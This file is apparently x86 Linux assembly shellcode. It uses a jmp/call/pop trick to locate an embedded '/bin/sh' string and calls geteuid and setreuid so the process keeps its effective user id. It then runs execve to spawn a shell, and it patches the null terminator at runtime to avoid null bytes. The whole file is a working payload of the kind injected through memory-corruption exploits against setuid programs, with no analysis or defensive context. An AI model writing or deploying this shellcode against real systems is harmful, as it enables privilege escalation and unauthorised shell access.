.text
.globl main
main:
        jmp foo
bar:
        # recover string addr
        popl %esi
 
        # uid_t geteuid(void)
        xor %eax, %eax
        movb $49, %al
        int $0x80
 
        # int setreuid(uid_t ruid, uid_t euid)
        movl %eax, %ebx
        movl %eax, %ecx
        xor %eax, %eax
        movb $70, %al
        int $0x80
 
        # int execve(const char *filename, char *const argv[],
        #          char *const envp[])
        xor %eax, %eax
        movb %al, 7(%esi)
        movl %esi, %ebx
        movl %esi, 8(%esi)
        leal 8(%esi), %ecx
        movl %eax, 12(%esi)
        xor %edx, %edx
        movb $11, %al
        int $0x80
 
foo:
        call bar
baz:
        # pos:  0123456789abcdef
        .ascii "/bin/sh#########"

